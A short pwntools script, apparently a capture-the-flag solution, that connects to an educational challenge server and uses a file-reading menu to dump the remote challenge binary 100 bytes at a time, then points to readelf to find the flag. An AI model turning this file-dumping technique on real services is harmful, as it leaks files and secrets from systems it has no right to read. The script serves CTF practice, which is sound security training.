#!/usr/bin/env python3

import sys
from pwn import *

p = remote('edu-ctf.zoolab.org',10001)
fp = open("chal_remote", "wb")
 
p.recvuntil(b'> ')
p.sendline(b'1')
p.recvuntil(b'> ')
p.sendline(b'/home/chal/chal')

for i in range(168):  
    p.recvuntil(b'> ')
    p.sendline(b'5')
    p.recvuntil(b'> ')
    p.sendline(str(i*100).encode())
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'> ')
    p.sendline(b'3')
    reply = p.recv(100)
    fp.write(reply)

fp.close()

# use "readelf -x 25 chal_remote" to find flag